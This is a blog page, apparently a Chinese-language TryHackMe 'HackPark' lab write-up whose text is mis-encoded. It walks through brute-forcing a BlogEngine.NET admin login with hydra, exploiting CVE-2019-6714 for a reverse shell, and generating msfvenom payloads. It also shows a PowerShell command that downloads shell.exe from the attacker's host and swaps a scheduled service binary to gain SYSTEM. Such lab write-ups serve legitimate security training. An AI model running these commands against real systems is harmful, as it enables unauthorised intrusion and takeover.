<!DOCTYPE html>
<html lang="zh-CN">
    
    <head>
    <meta charset="utf-8">
    <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0,  viewport-fit=cover" name="viewport" />
    <meta name="description" content="Try Hack Me-HackPark" />
    <meta name="hexo-theme-A4" content="v1.8.2" />
    <link rel="alternate icon" type="image/webp" href="/img/favicon.webp">
    <title>v2ish1yan</title>

    
        
<link rel="stylesheet" href="/css/a11y-dark.min.css">

        
<link rel="stylesheet" href="/css/reset.css">

        
<link rel="stylesheet" href="/css/markdown.css">

        
<link rel="stylesheet" href="/css/fonts.css">
 
         <!--æ³¨æ„ï¼šé¦–é¡µæ—¢ä¸æ˜¯postä¹Ÿä¸æ˜¯page-->
        
            
<link rel="stylesheet" href="/css/waline.css">

        
        
        
<link rel="stylesheet" href="/css/ui.css">
 
        
<link rel="stylesheet" href="/css/style.css">


        
            <!--è¿”å›é¡¶éƒ¨css-->
            
<link rel="stylesheet" href="/css/returnToTop.css">

            
<link rel="stylesheet" href="/css/unicons.css">

        
        
            <!--ç›®å½•-->
            
<link rel="stylesheet" href="/css/toc.css">

        
    
    

<meta name="generator" content="Hexo 6.3.0"></head>
    
    <style>
        :root {
            --waline-theme-color: #000000; 
            --waline-color: #000000; 
            --waline-border-color: #000000; 
            --waline-white: #000000; 
            --waline-bgcolor-light: #ffffff;  
        }
        body {
            color: #000000;
            background: #e4e4e4;
        }
        .post-md code {
            background: #212425;
            color: white; 
        }
        .year-font-color {
            color: #000000 !important;
        }
        .wl-card span.wl-nick {
            color: #000000; 
        }
        .wl-card .wl-badge {
            border: 1px solid #000000;
            color: #000000; 
        }
        .wl-btn {
            border: 1px solid #000000; 
            color:  #000000;  
        }
        .wl-btn.primary {
            color: #ffffff; 
        }
        .wl-header label {
            color: #000000;
        }
        a {
            color: rgb(239, 112, 96);
        }

        .post-md a {
            color: rgb(239, 112, 96);
        }

        .nav li a {
            color: rgb(239, 112, 96);
        }

        .archive-main a:link {
            color: rgb(239, 112, 96);
        }
        .archive-main a:visited {
            color: rgb(239, 112, 96); 
        }

        .archive li span {
            color: #000000;
        }

        .post-main-title {
            color: #000000;
        }

        .post-md h1,
        .post-md h2,
        .post-md h3,
        .post-md h4,
        .post-md h5,
        .post-md h6 {
            color: #000000;
        }

        [data-waline] p {
            color: #000000;
        }
        [data-waline] a {
            color: #000000;
        } 
        .wl-sort li.active {
            color: #000000;
        }

        .wl-card .wl-meta>span {
            background: #ffffff;
        }

        .paper {
            background: #e4e4e4;
        }

        .index-main {
            background: #ffffff;
        }

        .paper-main {
            background: #ffffff;
        }

        .wl-panel {
            background: #ffffff;
        }

        .archive li:nth-child(odd) {
            background: #ffffff;
            ;
        }

        .archive li:nth-child(even) {
            background: #ffffff;
        }

        .post-md>table tr:nth-child(odd) td {
            background: #ffffff;
        }

        .post-md>table tr:nth-child(even) td {
            background: #ffffff;
        }

    
        .progress-wrap::after {
            color: #000000; /* ç®­å¤´çš„é¢œè‰² */
        }
        .progress-wrap svg.progress-circle path {
	        stroke: #000000; /* è¾¹æ¡†çš„é¢œè‰² */
        }
        .progress-wrap::before {
	        background-image: linear-gradient(298deg, rgb(239, 112, 96), rgb(239, 112, 96)); /* é¼ æ ‡æ»‘è¿‡çš„ç®­å¤´é¢œè‰² */
         }

         .left-toc-container::-webkit-scrollbar-thumb {
            background-color: #000000; /* è®¾ç½®æ»šåŠ¨æ¡æ‹–åŠ¨å—çš„é¢œè‰² */
        }

        .bs-docs-sidebar .nav>.active>a,
        .bs-docs-sidebar .nav>li>a:hover,
        .bs-docs-sidebar .nav>li>a:focus {
            color: rgb(239, 112, 96);
            border-left-color: rgb(239, 112, 96);
        }
        .bs-docs-sidebar .nav>li>a {
            color:  #000000;
        }
    </style>

    
    <body>
        
            <div class="left-toc-container">
                <nav id="toc" class="bs-docs-sidebar"></nav>
            </div>
        
        <div class="paper">
            
            
            
            
                <div class="shadow-drop-2-bottom paper-main">
                    
<div class="header">
    <div class="header-container">
        <img style="
        width: 56px;
        height: auto;" alt="^-^" cache-control="max-age=86400" class="header-img" src="/img/favicon.webp" width="10%"></img>
        <div class="header-content">
            <a class="logo" href="/">v2ish1yan</a> 
            <span class="description">ä¸€åˆ‡éƒ½æ˜¯å…´è¶£ä½¿ç„¶</span> 
        </div>
        
    </div>
    
   
    <ul class="nav">
        
            
                <li><a href="/">é¦–é¡µ</a></li>
            
        
            
                <li><a href="/list/">æ–‡ç« </a></li>
            
        
            
                <li><a href="/tags/">æ ‡ç­¾</a></li>
            
        
            
                <li><a href="/categories/">åˆ†ç±»</a></li>
            
        
            
                <li><a href="/about/">å…³äº</a></li>
            
        
            
                <li><a href="/friends/">å‹é“¾</a></li>
            
        
    </ul>
</div> 
        
                    
                    

                    
                    
                    
                    <!--è¯´æ˜æ˜¯æ–‡ç« posté¡µé¢-->
                    
                        <div class="post-main">

    
        <div class="post-main-title">
            Try Hack Me-HackPark
        </div>
      
    

    <div class="post-md">
        
            
                <ol class="post-toc"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#%E7%88%86%E7%A0%B4%E5%AF%86%E7%A0%81%EF%BC%8C%E7%99%BB%E5%BD%95%E5%90%8E%E5%8F%B0"><span class="post-toc-text">çˆ†ç ´å¯†ç ï¼Œç™»å½•åå°</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#%E8%8E%B7%E5%BE%97webshell"><span class="post-toc-text">è·å¾—webshell</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#%E4%BD%BF%E7%94%A8metesploit%E7%9B%91%E5%90%ACshell"><span class="post-toc-text">ä½¿ç”¨metesploitç›‘å¬shell</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#%E6%8F%90%E6%9D%83"><span class="post-toc-text">ææƒ</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#%E4%B8%8D%E9%80%9A%E8%BF%87metesploit%E7%9B%91%E5%90%ACshell%E7%9A%84%E6%96%B9%E5%BC%8F"><span class="post-toc-text">ä¸é€šè¿‡metesploitç›‘å¬shellçš„æ–¹å¼</span></a></li></ol>
            
        
        <h2 id="çˆ†ç ´å¯†ç ï¼Œç™»å½•åå°"><a href="#çˆ†ç ´å¯†ç ï¼Œç™»å½•åå°" class="headerlink" title="çˆ†ç ´å¯†ç ï¼Œç™»å½•åå°"></a>çˆ†ç ´å¯†ç ï¼Œç™»å½•åå°</h2><p>ä½¿ç”¨gobusteré…åˆseclistsçš„å­—å…¸æ¥çˆ†ç ´åå°è·¯å¾„</p>
<pre><code class="bash">./gobuster dir -u 10.10.40.22 -w /usr/share/seclists/Discovery/Web-Content/common.txt
</code></pre>
<p>å‘ç°åå°è·¯å¾„</p>
<p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202301032158581.png" alt="image-20230103215608183"></p>
<p>ç„¶åå‘é€è¡¨å•æ•°æ®ï¼Œå¯ä»¥çŸ¥é“æ˜¯POSTè¯·æ±‚</p>
<p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202301032158572.png" alt="image-20230103215732978"></p>
<p>ä½¿ç”¨<a target="_blank" rel="noopener" href="https://github.com/vanhauser-thc/thc-hydra">hydra</a>çˆ†ç ´å¯†ç </p>
<pre><code class="bash">hydra -l admin -P /usr/share/seclists/Passwords/darkweb2017-top10000.txt    10.10.40.22 http-form-post &quot;/Account/login.aspx?ReturnURL=/admin:__VIEWSTATE=vw5J1ZVXeuOsqHTRBMThsDt0My7yl9%2F58xs%2F9JecZf3L2TxMaYYCfEmvjBo7dAo2xU9lY9qG1RqV9Q%2FwCyuJhBGGIbX1BF4vSV9uhs1Jp%2B%2BDW8x3IyAETgYpstaFI%2B5vjy0OXYvDA%2F%2Bo%2BltAyih7HFg3YOCIFUxjN5Uqda41582vq4gw&amp;__EVENTVALIDATION=F16dU6mFH%2FZqYExyyFz8QDA2ZfV%2F9lhAJf8knWmPcA%2BSalr%2FtNT8OI%2FcLoS1WfVqi%2BcLjNuR278Z6EUr21MfgT6qFfcnIC%2FnBVi32%2BlQ2QUhax%2F0FiRUxsFmaFhgRgK6DPIkxvtN8gA53zqN8cVhWrMuB7NhxDbpKdxVFan86w5lUB%2BX&amp;ctl00%24MainContent%24LoginUser%24UserName=admin&amp;ctl00%24MainContent%24LoginUser%24Password=^PASS^&amp;ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login Failed&quot; -Vv
</code></pre>
<pre><code class="bash"># -Vv æ˜¾ç¤ºç ´è§£è¿‡ç¨‹
# -l è¡¨ç¤ºå•ä¸ªå¯†ç 
# -P è¡¨ç¤ºå¤šä¸ªå¯†ç ï¼Œä¸€èˆ¬ä¸ºæ–‡ä»¶
#Login Failedb è¡¨ç¤ºçš„æ˜¯å¦‚æœç™»å½•å¤±è´¥ï¼Œé¡µé¢è¿”å›çš„å†…å®¹
</code></pre>
<p>è¿™é‡Œçš„å¯†ç è¦ç”¨<code>^PASS^</code>æ¥å ä½</p>
<p>å¾—åˆ°å¯†ç :<code>1qaz2wsx</code></p>
<p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202301032244556.png" alt="image-20230103224403526"></p>
<table>
<thead>
<tr>
<th><strong>å‘½ä»¤</strong></th>
<th><strong>æè¿°</strong></th>
</tr>
</thead>
<tbody><tr>
<td>hydra -P <wordlist> -v <ip> <protocol></td>
<td>é’ˆå¯¹æ‚¨é€‰æ‹©çš„åè®®è¿›è¡Œæš´åŠ›ç ´è§£</td>
</tr>
<tr>
<td>hydra -v -V -u -L <username list> -P <password list> -t 1 -u <ip> <protocol></td>
<td>æ‚¨å¯ä»¥ä½¿ç”¨ Hydra æ¥æš´åŠ›ç ´è§£ç”¨æˆ·åå’Œå¯†ç ã€‚å®ƒå°†éå†åˆ—è¡¨ä¸­çš„æ¯ä¸ªç»„åˆã€‚ï¼ˆ-vV &#x3D; è¯¦ç»†æ¨¡å¼ï¼Œæ˜¾ç¤ºç™»å½•å°è¯•ï¼‰</td>
</tr>
<tr>
<td>hydra -t 1 -V -f -l <username> -P <wordlist> rdp:&#x2F;&#x2F;<ip></td>
<td>ä½¿ç”¨å¯†ç åˆ—è¡¨æ”»å‡» Windows è¿œç¨‹æ¡Œé¢ã€‚</td>
</tr>
<tr>
<td>hydra -l <username> -P .<password list> $ip -V http-form-post â€˜&#x2F;wp-login.php:log&#x3D;^USER^&amp;pwd&#x3D;^PASS^&amp;wp-submit&#x3D;Log In&amp;testcookie&#x3D;1:S&#x3D;Locationâ€™</td>
<td>ä¸º Hydra æå‡ºæ›´å…·ä½“çš„è¦æ±‚ä»¥è¿›è¡Œæš´åŠ›ç ´è§£ã€‚</td>
</tr>
</tbody></table>
<h2 id="è·å¾—webshell"><a href="#è·å¾—webshell" class="headerlink" title="è·å¾—webshell"></a>è·å¾—webshell</h2><p>ç™»å…¥åå°ï¼Œå‘ç°è¿™ä¸ªç½‘ç«™çš„CMSä¸º<code>BlogEngine.NET</code>ï¼Œä¸”ç‰ˆæœ¬ä¸º3.3.6.0</p>
<p>åœ¨<a target="_blank" rel="noopener" href="http://www.exploit-db.com/">exploit æ•°æ®åº“å­˜æ¡£</a>æŸ¥æ‰¾ç›¸å…³æ¼æ´</p>
<p>æ‰¾åˆ°<a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/46353">CVE-2019-6714</a><br>æŒ‰ç…§è¦æ±‚ï¼Œæ”¹ä¸€ä¸‹expé‡Œçš„ipå’Œportï¼ŒæŠŠæ–‡ä»¶åæ”¹ä¸ºPostView.ascxï¼Œç„¶åå†ä¸Šä¼ </p>
<p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202301032301496.png" alt="image-20230103230104393"></p>
<p>kaliå¼€å¯ç›‘å¬</p>
<pre><code class="bash">nc -lvvp 9999
</code></pre>
<p>è®¿é—®<code>/?theme=../../App_Data/files</code>åå¾—åˆ°åå¼¹shell</p>
<p>æ‰§è¡Œ<code>whoami</code>å¾—åˆ°è¿è¡Œè¿™ä¸ªç½‘ç«™çš„äºº</p>
<p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202301032303588.png" alt="image-20230103230346561"></p>
<h2 id="ä½¿ç”¨metesploitç›‘å¬shell"><a href="#ä½¿ç”¨metesploitç›‘å¬shell" class="headerlink" title="ä½¿ç”¨metesploitç›‘å¬shell"></a>ä½¿ç”¨metesploitç›‘å¬shell</h2><p>ç„¶åæ”¹ç”¨metesploitçš„meterpreteræ¥è¿›è¡Œç›‘å¬</p>
<p>è¦å…ˆæ‰¾åˆ°è¿™ä¸ªwindowsçš„æ¼æ´ï¼Œç„¶åå†ç”¨msfvenomç”Ÿæˆæ”»å‡»è½½è·</p>
<p>å…ˆç”¨<code>systeminfo</code>å¾—åˆ°è¿™ä¸ªwindowsçš„ä¿¡æ¯ï¼Œç„¶åç”¨<a target="_blank" rel="noopener" href="https://github.com/bitsadmin/wesng">wes-ng</a>æ¥æŸ¥æ‰¾æ¼æ´</p>
<pre><code class="bash">python3 wes.py system.txt
</code></pre>
<p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202301032316631.png" alt="image-20230103231646552"></p>
<p>è¿™é‡Œå¾—åˆ°çš„ä¿¡æ¯å…¶å®æ²¡æœ‰é‚£ä¹ˆé‡è¦ï¼Œå› ä¸ºæˆ‘ä»¬å·²ç»æœ‰ä¸€ä¸ªshelläº†</p>
<p>æˆ‘ä»¬å¯ä»¥ç”Ÿæˆä¸€ä¸ªåå¼¹shellè½½è·ï¼Œè®©ç›®æ ‡ä¸»æœºä¸‹è½½ä¸‹æ¥ï¼Œç„¶åè®©ä»–æ‰§è¡Œè¿™ä¸ªè½½è·ï¼Œå°±å¯ä»¥åå¼¹shelläº†</p>
<p>ç”Ÿæˆpayload</p>
<pre><code class="bash">msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.18.104.32  LPORT=9999 -f exe &gt;shell.exe
</code></pre>
<p>åœ¨kaliä¸Šå¼€å¯ä¸€ä¸ªpythonæœåŠ¡ï¼Œé€šè¿‡ä¹‹å‰çš„shellï¼Œè®©ç›®æ ‡ä¸»æœºä¸‹è½½ä¸‹æ¥</p>
<pre><code class="bash">python3 -m http.server   
</code></pre>
<p>ç›®æ ‡ä¸»æœºä¸Šï¼š</p>
<p>ä¸Šä¼ åˆ°<code>C:\Windows\Temp</code>å› ä¸ºè¿™ä¸ªç›®å½•å¾€å¾€æ˜¯å¯å†™çš„</p>
<pre><code class="bash">powershell -c &quot;Invoke-WebRequest -Uri &#39;http://10.18.104.32:8000/shell.exe&#39; -OutFile &#39;C:\Windows\Temp\shell.exe&#39;&quot;
</code></pre>
<p>shell.exeè¢«æˆåŠŸä¸Šä¼ </p>
<p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202301032330196.png" alt="image-20230103233054145"></p>
<p>ç„¶åå¼€å¯metesploit</p>
<pre><code class="bash">msfconsole
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 10.18.104.32
set LPORT 9999
run
</code></pre>
<p>åœ¨ç›®æ ‡ä¸»æœºæ‰§è¡Œshell.exe</p>
<pre><code class="bash">shell.exe
</code></pre>
<p>meterpreteræˆåŠŸä¸Šçº¿ç›®æ ‡ä¸»æœº</p>
<p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202301032334621.png" alt="image-20230103233429588"></p>
<p>æ‰§è¡Œ</p>
<pre><code class="bash">sysinfo
</code></pre>
<p>å¯ä»¥æŸ¥çœ‹ç³»ç»Ÿä¿¡æ¯</p>
<p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202301041332791.png" alt="image-20230104133205675"></p>
<h2 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h2><p>æˆ‘ä»¬è¦è¿›è¡Œææƒï¼Œä½¿ç”¨<a target="_blank" rel="noopener" href="https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS/winPEASbat"><strong>WinPEAS</strong></a>æ¥æŸ¥çœ‹ç›¸å…³çš„ä¿¡æ¯</p>
<p>ä½¿ç”¨ç›¸åŒçš„æ–¹å¼æ¥ä¸Šä¼ è¿™ä¸ªæ–‡ä»¶</p>
<pre><code class="bash">powershell -c &quot;Invoke-WebRequest -Uri &#39;http://10.18.104.32:8000/winPEAS.bat&#39; -OutFile &#39;C:\Windows\Temp\winPEAS.bat&#39;&quot;
</code></pre>
<p>å› ä¸ºç³»ç»ŸæœåŠ¡å¤§å¤šæ˜¯ä»¥systemæƒé™å¯åŠ¨çš„ï¼Œæ‰€ä»¥å…¶å¯¹åº”çš„äºŒè¿›åˆ¶ä¹Ÿå°±ä»¥systemæƒé™å¯åŠ¨ã€‚</p>
<p>æ‰€ä»¥è¿™é‡Œææƒçš„æ–¹å¼æ˜¯ï¼Œä¿®æ”¹ç³»ç»ŸæœåŠ¡å¯¹åº”çš„äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œå°†å…¶ä¿®æ”¹ä¸ºæˆ‘ä»¬çš„æ”»å‡»è½½è·ï¼Œå³ä¸Šé¢çš„<code>shell.exe</code>ã€‚</p>
<p>ç”¨winpeas.batå¯ä»¥çœ‹åˆ°ä¸€äº›æœåŠ¡å¯¹åº”çš„äºŒè¿›åˆ¶æ–‡ä»¶</p>
<p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202301041359769.png" alt="image-20230104135959702"></p>
<p>ä½¿ç”¨winpeas.exeç›´æ¥æŸ¥çœ‹æœåŠ¡ä¿¡æ¯</p>
<pre><code class="bash">winpeas.exe serviceinfo
</code></pre>
<p>winpeas.exeå‚æ•°</p>
<pre><code>domain               Enumerate domain information
systeminfo           Search system information
userinfo             Search user information
processinfo          Search processes information
servicesinfo         Search services information
applicationsinfo     Search installed applications information
networkinfo          Search network information
windowscreds         Search windows credentials
browserinfo          Search browser information
filesinfo            Search generic files that can contains credentials
fileanalysis         Search specific files that can contains credentials and for regexes inside files
eventsinfo           Display interesting events information

quiet                Do not print banner
notcolor             Don&#39;t use ansi colors (all white)
searchpf             Search credentials via regex also in Program Files folders
wait                 Wait for user input between checks
debug                Display debugging information - memory usage, method execution time
log[=logfile]        Log all output to file defined as logfile, or to &quot;out.txt&quot; if not specified
MaxRegexFileSize=1000000        Max file size (in Bytes) to search regex in. Default: 1000000B

Additional checks (slower):
-lolbas              Run additional LOLBAS check
-linpeas=[url]       Run additional linpeas.sh check for default WSL distribution, optionally provide custom linpeas.sh URL
                     (default: https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh)
</code></pre>
<p>å¯ä»¥çœ‹åˆ°å­˜åœ¨å¯ä»¥ææƒçš„æœåŠ¡<code>WindowsScheduler</code></p>
<p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202301041418128.png" alt="image-20230104141834072"></p>
<p>å»åˆ°å¯¹åº”ç›®å½•ï¼Œå¯ä»¥å‘ç°å­˜åœ¨åŒ…å«æ—¥å¿—çš„<code>Events</code>ç›®å½•</p>
<p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202301041422881.png" alt="image-20230104142213846"></p>
<p>æŸ¥çœ‹æ—¥å¿—ï¼Œå‘ç°ä»–æ˜¯é—´éš”30så·¦å³ï¼Œæ‰§è¡Œä¸€æ¬¡<code>Message.exe</code>ï¼Œä¸”ä»¥Administratoræƒé™æ‰§è¡Œ</p>
<p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202301041422335.png" alt="image-20230104142244294"></p>
<p>å†å»çœ‹è¿™ä¸ªæ–‡ä»¶ï¼Œå‘ç°å¯ä»¥ä¿®æ”¹</p>
<p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202301041423172.png" alt="image-20230104142318141"></p>
<p>æŠŠä¹‹å‰ç”Ÿæˆçš„shell.exeä¸Šä¼ åˆ°è¿™é‡Œï¼Œæ”¹åä¸ºMessage.exeï¼Œç„¶åå†å¼€å¯ä¸€ä¸ªç›‘å¬ï¼Œå°±å¯ä»¥å¾—åˆ°systemæƒé™çš„shell</p>
<p>ç›´æ¥ä½¿ç”¨meterpreterä¸Šä¼ </p>
<pre><code class="bash">upload shell.exe &quot;C:\Program Files (x86)\SystemScheduler\1.exe&quot;
mv Message.exe Message.exe.bak
mv 1.exe Message.exe
background
run
</code></pre>
<p>ç­‰ä»–æ‰§è¡Œæˆ‘ä»¬ä¸Šä¼ ä¸Šå»çš„æ¶æ„Message.exeåï¼Œå°±å¯ä»¥å¾—åˆ°systemæƒé™çš„shell</p>
<p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202301041432132.png" alt="image-20230104143237095"></p>
<p>ç„¶ååœ¨<code>C:\Users\jeff\Desktop\user.txt</code>å¾—åˆ°user flag</p>
<p>åœ¨<code>C:\Users\Administrator\Desktop\root.txt</code>å¾—åˆ°root flag</p>
<h2 id="ä¸é€šè¿‡metesploitç›‘å¬shellçš„æ–¹å¼"><a href="#ä¸é€šè¿‡metesploitç›‘å¬shellçš„æ–¹å¼" class="headerlink" title="ä¸é€šè¿‡metesploitç›‘å¬shellçš„æ–¹å¼"></a>ä¸é€šè¿‡metesploitç›‘å¬shellçš„æ–¹å¼</h2><p>å¯ä»¥ä½¿ç”¨netcatï¼Œä½†æ˜¯msfvenomç”Ÿæˆpayloadçš„å‘½ä»¤æœ‰æ‰€ä¸åŒ</p>
<pre><code class="bash">msfvenom -p windows/shell_reverse_tcp LHOST=$lhost LPORT=$lport -e x86/shikata_ga_nai -f exe -o reverse.exe
nc -lnvp $lport
</code></pre>

    </div>

    <div class="post-meta">
        <i>
        
            <span>2023-07-03</span>
            
                <span>è¯¥ç¯‡æ–‡ç« è¢« v2ish1yan</span>
            
            
                <span>æ‰“ä¸Šæ ‡ç­¾:
                    
                    
                        <a href='/tags/Try-Hack-Me/'>
                            Try Hack Me
                        </a>
                    
                </span>
             
             
                <span>å½’ä¸ºåˆ†ç±»:
                    
                    
                        <a href='/categories/Tryhackme/'>
                            Tryhackme
                        </a>
                    
                </span>
            
        
        </i>
    </div>
    
        
    <div class="comments-container">
    <div id="comment-anchor"></div>
    <div class="comment-area-title">
         
    </div>
    
        

    <div id="waline"></div>
    <script type="module"  >
        import { init } from 'https://npm.elemecdn.com/hexo-theme-a4@latest/source/js/waline.mjs'; 
        function loadWaline() {
            init({
                el: '#waline',
                serverURL: 'https://a4-talk.vercel.app',
                lang: 'zh-CN',
                dark: 'body[class~="dark-mode"]',
                requiredMeta: ['nick','mail'], // cannot customize by theme config, change it yourself
                search: false, // ç¦æ­¢è¡¨æƒ…åŒ…æœç´¢
                reaction: false, // å¯¹æ–‡ç« æ‰“åˆ†
                pageview: false, // æµè§ˆé‡ç»Ÿè®¡
                comment: false, // è¯„è®ºæ•°ç»Ÿè®¡

                locale: {
                    placeholder: 'æ¬¢è¿è¯„è®º', 
                    sofa: ''
                },
            });
            
        }
        window.addEventListener('DOMContentLoaded', loadWaline);
    </script>



    
    
    
    </div>


     
</div>



                                      
                    
                    
                    <div class="footer">
    
        <span> 
            Â© 1949-2024 China 

            
                

            
        </span>
    
</div>
<!--è¿™æ˜¯æŒ‡ä¸€æ¡çº¿å¾€ä¸‹çš„å†…å®¹-->
<div class="footer-last">
    
            <span>ğŸŒŠé¢æœå¤§æµ·ï¼Œæ˜¥æš–èŠ±å¼€ğŸŒ¸</span>
            
                <span class="footer-last-span-right"><i>æœ¬ç«™ç”±<a target="_blank" rel="noopener" href="https://hexo.io/zh-cn/index.html">Hexo</a>é©±åŠ¨ï½œä½¿ç”¨<a target="_blank" rel="noopener" href="https://github.com/HiNinoJay/hexo-theme-A4">Hexo-theme-A4</a>ä¸»é¢˜</i></span>
            
    
</div>


   
    
<script src="/js/highlight.min.js"></script>

    
<script src="/js/highlightjs-line-numbers.js"></script>


    
<script src="/js/randomHeaderContent.js"></script>

    <!--å›åˆ°é¡¶éƒ¨æŒ‰é’®-->
    
        
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.0/jquery.min.js"></script>

        
<script src="/js/returnToTop.js"></script>

    

    <!--ç›®å½•-->
    
        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/1.7.2/jquery.min.js" type="text/javascript" ></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/jqueryui/1.12.1/jquery-ui.min.js" type="text/javascript" ></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.tocify/1.9.0/javascripts/jquery.tocify.min.js" type="text/javascript" ></script>
        
<script src="/js/toc.js"></script>

    



<script>
    hljs.initHighlightingOnLoad();
    hljs.initLineNumbersOnLoad();
</script>



                </div>
            
            
                <!-- å›åˆ°é¡¶éƒ¨çš„æŒ‰é’®-->  
                <div class="progress-wrap shadow-drop-2-bottom">
                    <svg class="progress-circle svg-content" width="100%" height="100%" viewBox="-1 -1 102 102">
                        <path d="M50,1 a49,49 0 0,1 0,98 a49,49 0 0,1 0,-98"/>
                    </svg>
                </div>
            
    </body>


    <!--æš—é»‘æ¨¡å¼-->
    <script src="/js/darkmode-js.min.js"></script>
    <script>
        function addDarkmodeWidget() {
        const options = {
            bottom: '53px', // default: '32px'
            right: 'unset', // default: '32px'
            left: '42px', // default: 'unset'
            time: '0.3s', // default: '0.3s'
            mixColor: '#fff', // default: '#fff'
            backgroundColor: ' #e4e4e4  ',  // default: '#fff'
            buttonColorDark: '#100f2c',  // default: '#100f2c'
            buttonColorLight: '#fff', // default: '#fff'
            saveInCookies: true, // default: true,
            label: 'ğŸŒ“', // default: ''
            autoMatchOsTheme: true // default: true
        }
    
        const darkmode = new Darkmode(options);
        darkmode.showWidget();
        
        }
        window.addEventListener('load', addDarkmodeWidget);
    </script>
  
</html>